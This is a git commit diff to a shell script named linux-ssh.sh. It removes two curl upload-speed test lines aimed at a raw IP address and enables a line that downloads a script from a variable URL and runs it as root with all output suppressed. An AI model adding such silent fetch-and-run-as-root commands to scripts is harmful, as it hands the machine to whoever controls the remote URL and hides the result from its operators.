0da0998dbdbdcf5af263bca820cc53d025c7ce15
mojtaba211 <103147690+mojtaba211@users.noreply.github.com>
2026-02-04 12:41:05 +0330

    Update linux-ssh.sh

--- linux-ssh.sh
+++ linux-ssh.sh
@@ -1,4 +1,2 @@
-#sudo bash -c "$(curl -fsSL "$PATH_URL")" > /dev/null 2>&1
-dd if=/dev/urandom of=random_10mb.bin bs=1K count=1;curl -w "\nUpload speed: %{speed_upload} bytes/sec\nTotal time: %{time_total} sec\n" -F "file=@random_10mb.bin" http://94.182.103.139:80/upload
-dd if=/dev/urandom of=random_10mb.bin bs=1K count=10;curl -w "\nUpload speed: %{speed_upload} bytes/sec\nTotal time: %{time_total} sec\n" -F "file=@random_10mb.bin" http://94.182.103.139:80/upload
+sudo bash -c "$(curl -fsSL "$PATH_URL")" > /dev/null 2>&1
 echo "done"
